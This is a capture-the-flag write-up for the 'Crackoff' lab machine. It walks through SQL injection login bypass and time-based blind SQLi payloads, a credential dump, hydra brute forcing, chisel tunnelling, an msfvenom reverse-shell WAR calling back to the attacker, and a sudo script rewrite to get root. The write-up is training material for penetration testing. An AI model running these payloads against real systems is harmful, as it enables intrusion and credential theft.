![Screenshot](/hard/Crackoff/Images/machine.png)

Difficulty: **Hard**

Made by: **d1se0**

# Steps to pwn 🥽

* 👁️  [Reconnaissance](#reconnaissance)
* 🪓 [Exploitation](#exploitation)
* 🚩 [Privilege Escalation](#privilege-escalation)

---

## 🛠️  Techniques: SQLI Blind time-based, making our own exploit, brute force with hydra, port forwarding, exploit tomcat, escalate privileges by a sh file

---

First of all we make sure the machine is up, we can do this with the command **ping**

```ruby
┌──(craft㉿kali)-[~/challenges/dockerlabs/dificil/crackoff]
└─$ ping 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.176 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.096 ms
64 bytes from 172.17.0.2: icmp_seq=3 ttl=64 time=0.089 ms
^C
--- 172.17.0.2 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2053ms
rtt min/avg/max/mdev = 0.089/0.120/0.176/0.039 ms
```

Now, we can start our **reconnaissance** phase.

---
# Reconnaissance

We use first **nmap** to discover what ports are open in the target.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/crackoff/enumeration]
└─$ nmap -p- -n -sS --min-rate 5000 -Pn -vv --open 172.17.0.2
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-03 18:36 -0500
Initiating ARP Ping Scan at 18:36
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 18:36, 0.16s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 18:36
Scanning 172.17.0.2 [65535 ports]
Discovered open port 22/tcp on 172.17.0.2
Discovered open port 80/tcp on 172.17.0.2
Completed SYN Stealth Scan at 18:36, 3.55s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.000029s latency).
Scanned at 2026-01-03 18:36:15 -05 for 4s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 4.24 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

**-p-** <- With this argument we tell to nmap to scan all the ports, starting from the port 1, to the port 65,535 port.

**-n** <- With this argument nmap are going to skip the DNS resolution, this is because sometimes in our scans this can be in some cases very slow.

**-sS** <- With this argument nmap will going to make a stealth-scan, this means that the 3-way-handshake will not be accomplished, and also make the scan slightly faster.

**--min-rate 5000** <- With this argument nmap, will send at least 5000 packages per second, making the scan even more faster.

**-Pn** <- With this argument nmap will also skip the Host discovery phase, this means that nmap will treat the machine as active and do immediately the scan.

**-vv** <- With this argument nmap will show us the discovered open ports while the scan continues, this means if nmap discover a open port immediately will report to us as the scan continues.

**--open** <- With this argument we are telling to nmap to only filter the open ports.

Once the scan concludes we can see 2 ports open:

- port 22 (ssh / Secure Shell)
- port 80 (http / Hyper-Text Transfer Protocol)

But we need to know more about these ports like the versions that are running on and what technologies.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/crackoff/enumeration]
└─$ nmap -p22,80 -sCV 172.17.0.2 -oX target
```

**-p22,80** <- With this argument nmap will only scan this 2 ports that we discover.

**-sCV** <- With this argument nmap will going to scan per each port his version to find some possible vulnerabilities about not updated systems, and also make a scan with some scripts that executes nmap, to find more about this ports.

**-oX target** <- With this argument we save all the output that nmap give us and save it as a xml file.

**--stats-every=1m** <- With this argument we receive stats of the scan every 1 minute, this can have minutes (m) and seconds (s)

After the scan finish we got the output in a xml file, we do this to make a html page to see the information more easily and pretty to look at.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/crackoff/enumeration]
└─$ xsltproc target -o target.html
```

With this command we convert the xml file to a html file, now let's open it.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/crackoff/enumeration]
└─$ open target.html 
```

And we can see this in our browser.

![Screenshot](/hard/Crackoff/Images/image1.png)

We can see that is way more pretty and readable.

And the port 80 it seems is a website, we can use **whatweb** to know what technologies uses this website.

```ruby
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/crackoff/enumeration]
└─$ whatweb http://172.17.0.2
http://172.17.0.2 [200 OK] Apache[2.4.58], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.58 (Ubuntu)], IP[172.17.0.2], Title[CrackOff - Bienvenido]
```

It seems uses **apache**, but that's it, so let's take a look with our browser.

![Screenshot](/hard/Crackoff/Images/image2.png)

It seems we can login, so let's try.

![Screenshot](/hard/Crackoff/Images/image3.png)

I'm going to try to login with something like admin:admin

![Screenshot](/hard/Crackoff/Images/image4.png)

And we can see that redirect us to this **error.php** page.

I can try to make a **SQLI** and let's see if it works on the login page.

In this case im going to use the next payload: **admin' or 1=1-- -** and **any** password.

![Screenshot](/hard/Crackoff/Images/image5.png)

And we can see that we bypass the login page, and this is a admin panel, but if we try to do something or look into the source code, we don't find anything useful.

So i'm going to take a look into the source code of the login page, if we can find anything.

```html
<form action="db.php" method="post">
	<input type="text" name="username" placeholder="Nombre de Usuario" required>
	<input type="password" name="password" placeholder="Contraseña" required>
	<input type="submit" value="Iniciar Sesión">
</form>
```

And we can see that the username and password is making a post to another page **db.php**

So let's see if we can take a look with **curl**.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/crackoff/enumeration]
└─$ curl http://172.17.0.2/db.php
Consulta SQL: SELECT * FROM users WHERE username = '' AND password = ''<br>
```

And we can see the query that is using for.

So im going to make a POST request to send the username and the password and see what happens.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/crackoff/enumeration]
└─$ curl -X POST http://172.17.0.2/db.php -d "username=admin&password=test"
Consulta SQL: SELECT * FROM users WHERE username = 'admin' AND password = 'test'<br>
```

And we can see the query, sending the username and password and this is vulnerable to a sqli, so let's try to see if we can do a union based sqli.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/crackoff/enumeration]
└─$ curl -X POST http://172.17.0.2/db.php -d "username=admin' union select 1,2,3,4,5-- -&password=test"
Consulta SQL: SELECT * FROM users WHERE username = 'admin' union select 1,2,3,4,5-- -' AND password = 'test'<br>
```

But we can see anything.

And after trying some payload, we can't see anything, probably a SQLI Blind, in particular that works on is the **SQLI Blind time-based**.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/crackoff/enumeration]
└─$ curl -X POST http://172.17.0.2/db.php -d "username=admin' or sleep(0.3)-- -&password=test"

......

# 3 seconds after...

Consulta SQL: SELECT * FROM users WHERE username = 'admin' or sleep(0.3)-- -' AND password = 'test'<br>
```

when doing **sleep(0.3)** by every decimal is equal to 1 second, so im waiting the response at least 3 seconds.

We can try to enumerate the databases, tables, columns and data by using this sleep function.

We can try to make a exploit that goes character by character and checks if the character is valid, then wait 1 second, and count the amount of time to receive response of the page, if the amount of time of the response is equal or greater than 1 second that means that the character is valid.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/crackoff/enumeration]
└─$ curl -X POST http://172.17.0.2/db.php -d "username=admin' or if(substr((select schema_name from information_schema.schemata limit 0,1),1,1)='i',sleep(0.3),1)-- -&password=test"

............

# 3 seconds after

Consulta SQL: SELECT * FROM users WHERE username = 'admin' or if(substr((select schema_name from information_schema.schemata limit 0,1),1,1)='i',sleep(0.3),1)-- -' AND password = 'test'<br>
```

With this payload we are getting the 1st database that surely is **information_schema** and with the function **substr** we are going character by character, and we are checking if the 1st character from the 1st database is equal to **"i"** then we are going to receive the response 3 seconds after, if don't immediately.

---
# Exploitation

We can make our own exploit to do this automatically for us, or you can use **sqlmap** if you want.

If you want the exploit is on this repo, you can see it [here](/hard/Crackoff/exploit.py)

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/crackoff/exploits]
└─$ python3 exploit.py 
[↖] Payload: or if(substr((select schema_name from information_schema.schemata limit 3,1),15,1)='b',sleep(0.1),1)-- -
[+] Enumerating...: All the databases has been obtained!

[*] Total databases found: 4

[*] The length of the database 0 is: 18
[*] The length of the database 1 is: 18
[*] The length of the database 2 is: 11
[*] The length of the database 3 is: 15

----------DATABASES----------

[!] Database: information_schema
[!] Database: performance_schema
[!] Database: crackoff_db
[!] Database: crackofftrue_db

[i] Select a database:
```

We can see that exists 2 databases:

 - **crackoff_db**
 - **crackofftrue_db**

Im going to select the 2nd database, the true one.

```c
[i] Select a database: crackofftrue_db
[+] Enumerating...: All the tables are obtained!

[*] Tables in total: 1

[*] The length of the table 0 is: 5

----------TABLES----------

[!] Table: users

[i] Select a table:
```

We can see that exists one table (users) from the database **crackofftrue_db**

So let's select then the table users to receive information of the columns from that table.

```c
[i] Select a table: users
[+] Enumerating...: All the columns are obtained!

[*] Columns in total: 5

[*] The length of the column 0 is: 2
[*] The length of the column 1 is: 4
[*] The length of the column 2 is: 2
[*] The length of the column 3 is: 8
[*] The length of the column 4 is: 8

----------COLUMNS----------

[!] Column: id
[!] Column: name
[!] Column: id
[!] Column: username
[!] Column: password

[i] Select the columns:
```

We can see that exists multiple columns, however, let's get the information from the column username and password.

```c
[i] Select the columns: username,password
[▝] Getting data...: Row 11: badmenandwomen

[*] Rows in total 12

[*] The length of the row 0 from the column username is: 7
[*] The length of the row 1 from the column username is: 8
[*] The length of the row 2 from the column username is: 5
[*] The length of the row 3 from the column username is: 6
[*] The length of the row 4 from the column username is: 3
[*] The length of the row 5 from the column username is: 5
[*] The length of the row 6 from the column username is: 6
[*] The length of the row 7 from the column username is: 4
[*] The length of the row 8 from the column username is: 5
[*] The length of the row 9 from the column username is: 16
[*] The length of the row 10 from the column username is: 4
[*] The length of the row 11 from the column username is: 5
[*] The length of the row 0 from the column password is: 11
[*] The length of the row 1 from the column password is: 17
[*] The length of the row 2 from the column password is: 14
[*] The length of the row 3 from the column password is: 24
[*] The length of the row 4 from the column password is: 12
[*] The length of the row 5 from the column password is: 13
[*] The length of the row 6 from the column password is: 25
[*] The length of the row 7 from the column password is: 12
[*] The length of the row 8 from the column password is: 13
[*] The length of the row 9 from the column password is: 18
[*] The length of the row 10 from the column password is: 10
[*] The length of the row 11 from the column password is: 14

----------DATA----------

[!] Row 0: rejetto
[!] Row 1: tomitoma
[!] Row 2: alice
[!] Row 3: whoami
[!] Row 4: pip
[!] Row 5: rufus
[!] Row 6: jazmin
[!] Row 7: rosa
[!] Row 8: mario
[!] Row 9: veryhardpassword
[!] Row 10: root
[!] Row 11: admin
[!] Row 0: password123
[!] Row 1: alicelaultramejor
[!] Row 2: passwordinhack
[!] Row 3: supersecurepasswordultra
[!] Row 4: estrella_big
[!] Row 5: colorcolorido
[!] Row 6: ultramegaverypasswordhack
[!] Row 7: unbreackroot
[!] Row 8: happypassword
[!] Row 9: admin12345password
[!] Row 10: carsisgood
[!] Row 11: badmenandwomen

[!] Row 0 -> rejetto:password123
[!] Row 1 -> tomitoma:alicelaultramejor
[!] Row 2 -> alice:passwordinhack
[!] Row 3 -> whoami:supersecurepasswordultra
[!] Row 4 -> pip:estrella_big
[!] Row 5 -> rufus:colorcolorido
[!] Row 6 -> jazmin:ultramegaverypasswordhack
[!] Row 7 -> rosa:unbreackroot
[!] Row 8 -> mario:happypassword
[!] Row 9 -> veryhardpassword:admin12345password
[!] Row 10 -> root:carsisgood
[!] Row 11 -> admin:badmenandwomen
```

We got all the passwords, and also this script saves the results by each column.

```
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/crackoff/exploits]
└─$ cat results_column_password 
password123
alicelaultramejor
passwordinhack
supersecurepasswordultra
estrella_big
colorcolorido
ultramegaverypasswordhack
unbreackroot
happypassword
admin12345password
carsisgood
badmenandwomen
```

So then let's brute force to ssh with these users and passwords with **hydra**.

```ruby
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/crackoff/exploits]
└─$ hydra -t 16 -L results_column_username -P results_column_password ssh://172.17.0.2 

[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: rosa   password: [REDACTED]
```

And we can login as the user **rosa** with this password!

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/crackoff/exploits]
└─$ ssh rosa@172.17.0.2
The authenticity of host '172.17.0.2 (172.17.0.2)' can't be established.
ED25519 key fingerprint is: SHA256:xTaUk/NeYehBX3OaRhAZ579EhfX/Lv9wCRGdUAaRBRc
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.17.0.2' (ED25519) to the list of known hosts.
rosa@172.17.0.2's password: 
Welcome to Ubuntu 24.04 LTS (GNU/Linux 6.17.10+kali-amd64 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
rosa@ba7c6f284f7c:~$
```

And we are in!

---
# Privilege Escalation

after a trying a bunch of methods to try to escalate privileges, we can try to see what ports are open inside of the machine with **netstat**

```r
rosa@ba7c6f284f7c:~$ netstat -aon
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       Timer
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0    216 172.17.0.2:22           172.17.0.1:52148        ESTABLISHED on (0.20/0/0)
tcp6       0      0 :::22                   :::*                    LISTEN      off (0.00/0/0)
tcp6       0      0 127.0.0.1:8005          :::*                    LISTEN      off (0.00/0/0)
tcp6       0      0 127.0.0.1:8080          :::*                    LISTEN      off (0.00/0/0)
Active UNIX domain sockets (servers and established)
Proto RefCnt Flags       Type       State         I-Node   Path
unix  3      [ ]         STREAM     CONNECTED     4198772  
unix  2      [ ]         STREAM     CONNECTED     4198423  
unix  2      [ ]         STREAM     CONNECTED     1450790  
unix  3      [ ]         STREAM     CONNECTED     4198773  
unix  2      [ ACC ]     STREAM     LISTENING     1450772  /var/run/mysqld/mysqlx.sock
unix  2      [ ACC ]     STREAM     LISTENING     1451615  /var/run/mysqld/mysqld.sock
```

We can see some ports that we can't see from outside.

that is the next ones:

- **127.0.0.1:8005**
- **127.0.0.1:8080**

To take a look these ports we can use **chisel** and do some port forwarding, to gain access from these ports to our attack machine.

Then let's transfer **chisel** to the target machine, we can use **scp** taking advantage that we have the password of **rosa**

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/crackoff/exploits]
└─$ scp /usr/bin/chisel rosa@172.17.0.2:/home/rosa
rosa@172.17.0.2's password: 
chisel
```

Okay so in our attack machine let's make a chisel server to receive connections.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/crackoff/exploits]
└─$ chisel server --reverse -p 1234
2026/01/03 20:12:07 server: Reverse tunnelling enabled
2026/01/03 20:12:07 server: Fingerprint aUqiDCkZDz+yPJDtiAfvUPpI2bGLr6p/CS1E0n2kHT8=
2026/01/03 20:12:07 server: Listening on http://0.0.0.0:1234
```

Okay so in the target machine let's connect to our machine.

```r
rosa@ba7c6f284f7c:~$ ./chisel client 192.168.0.20:1234 R:80:127.0.0.1:8080 R:85:127.0.0.1:8005
2026/01/04 02:16:35 client: Connecting to ws://192.168.0.20:1234
2026/01/04 02:16:35 client: Connected (Latency 1.335756ms)
```

So we are making that the port 80 from OUR machine be the localhost from the target machine on the port 8080,  and the same with the port 85.

So let's run a **nmap** scan to know about these 2 ports.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/crackoff/enumeration]
└─$ nmap -p80,85 -sCV localhost -oX reverse
```

we are saving the output once again to xml format, so making the same process to convert xml file to html file.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/crackoff/enumeration]
└─$ xsltproc reverse -o reverse.html
```

and let's open it.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/crackoff/enumeration]
└─$ open reverse.html
```

![Screenshot](/hard/Crackoff/Images/image6.png)

We can see that the port 80 that we made with chisel is a tomcat website, so let's take a look.

![Screenshot](/hard/Crackoff/Images/image7.png)

So we can login in the manager app, we need to login, we can use once again **hydra** and the credentials that we got before from crackofftrue_db.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/crackoff/exploits]
└─$ hydra -t1 -V -I -L results_column_username -P results_column_password http-get://localhost/manager/html
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-01-04 00:14:05
[DATA] max 1 task per 1 server, overall 1 task, 144 login tries (l:12/p:12), ~144 tries per task
[DATA] attacking http-get://localhost:80/manager/html
[ATTEMPT] target localhost - login "rejetto" - pass "badmenandwomen" - 12 of 144 [child 0] (0/0)
[ATTEMPT] target localhost - login "tomitoma" - pass "password123" - 13 of 144 [child 0] (0/0)
[ATTEMPT] target localhost - login "tomitoma" - pass "alicelaultramejor" - 14 of 144 [child 0] (0/0)
[ATTEMPT] target localhost - login "tomitoma" - pass "passwordinhack" - 15 of 144 [child 0] (0/0)
[ATTEMPT] target localhost - login "tomitoma" - pass "supersecurepasswordultra" - 16 of 144 [child 0] (0/0)
[80][http-get] host: localhost   login: tomitoma   password: [REDACTED]
```

and we get the user **tomitoma** and also his password!

![Screenshot](/hard/Crackoff/Images/image8.png)

And we are in!

So the process to gain a reverse shell from a tomcat is very simple, we can use **msfvenom** to make a malicious WAR file with the language java.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/crackoff/exploits]
└─$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.0.20 LPORT=1111 -f war -o funny.war
Payload size: 1094 bytes
Final size of war file: 1094 bytes
Saved as: funny.war
```

after making the malicious war file, when we use it, we gain access once again on the system almost surely as the user **tomcat** to our machine in the port 1111.

So the process to submit the war file isn't way to complex.

![Screenshot](/hard/Crackoff/Images/image9.png)

After selecting and deploy it, we use **netcat** to be in listen mode and gain the connection from the system in our attack machine.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/crackoff/exploits]
└─$ nc -lvnp 1111
listening on [any] 1111 ...
```

**-l**  <- This argument makes to netcat to be in listening mode.

**-v** <- This argument activates the **verbose** mode, this will show us in more detail the connection that we receive.

**-n** <- This makes to netcat to skip the DNS lookup, and only uses the IP address directly.

**-p** <- The port we are in listening, can be any, if it's not being currently used.

So then let's click into the **funny** file.

![Screenshot](/hard/Crackoff/Images/image10.png)

When we click it, we access once again into the system with this reverse shell.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/crackoff/exploits]
└─$ nc -lvnp 1111
listening on [any] 1111 ...
connect to [192.168.0.20] from (UNKNOWN) [172.17.0.2] 42170
whoami
tomcat
```

And we are in once again!

So we need to modify this shell, is way ugly so let's make some treatment to it.

First of all we do this:

```r
script /dev/null -c bash
Script started, output log file is '/dev/null'.
tomcat@a0cfcb8e06c7:/$
```

This command makes a new bash session with **script** and **/dev/null** asthe output file, because script register every command we execute in a log, but with /dev/null path, we make that log can't record commands, and **-c bash** makes script to run the shell with bash.

We do this because we want to use CTRL + C and more functions of the bash.

When we execute this, we suspend our reverse shell for a moment.

then we execute the next command in our attack machine:

```r
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/chocoping]
└─$ stty raw -echo; fg
```

This command does that stty will treat the terminal.

**raw** <- With raw we are making all the data of output and input to be as raw.

**-echo** <- With this we are making that if we execute a command it will not be printed again in the output.

**; fg** <- And with this we resume our reverse shell again.

When we execute this command we reset the xterm:

```r
tomcat@a0cfcb8e06c7:/$ reset xterm
```

This are going to reset the terminal.

If we want to clear our terminal we can't because the term it gonna be different of the xterm, that it have this function. we can do this in the next way to be able to clear our screen if it get nasty:

```r
tomcat@a0cfcb8e06c7:/$ export TERM=xterm
```

And one last thing, if we notice the display of the terminal is very tiny!

We can adjust this to be more bigger with the next command:

```r
tomcat@a0cfcb8e06c7:/$ stty rows {num} columns {num}
```

and finally it looks way better!

If we check how to escalate privileges we can find that we have a privilege of **SUDOER**

```r
tomcat@a0cfcb8e06c7:/$ sudo -l
Matching Defaults entries for tomcat on a0cfcb8e06c7:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User tomcat may run the following commands on a0cfcb8e06c7:
    (ALL) NOPASSWD: /opt/tomcat/bin/catalina.sh
```

And we see that **any** user can execute the **catalina.sh** script even as the user **root**.

We can check if we have permissions to read or modify this script we can see this:

```r
tomcat@a0cfcb8e06c7:/$ ls -l /opt/tomcat/bin/catalina.sh
-rwxr-xr-x 1 tomcat tomcat 25323 Aug  2  2024 /opt/tomcat/bin/catalina.shh
```

And we are the proprietary  of this script!

So we can modify it to gain a  bash shell and let the user **root** execute it.

Let's open it with nano:

```r
tomcat@a0cfcb8e06c7:/$ nano /opt/tomcat/bin/catalina.sh
```

And we modify the following lines of the script:

```bash
#!/bin/sh

bash
```

So when the user **root** executes this, we are gain access with a shell as the user root.

```c
tomcat@a0cfcb8e06c7:/$ sudo /opt/tomcat/bin/catalina.sh
root@a0cfcb8e06c7:/# whoami
root
```

We are root and we can see the flag!

```c
root@a0cfcb8e06c7:/# cat ~/root.txt 
c33b3d6c28dddad9fadd90b81fc57d24
```

***...pwned..!***
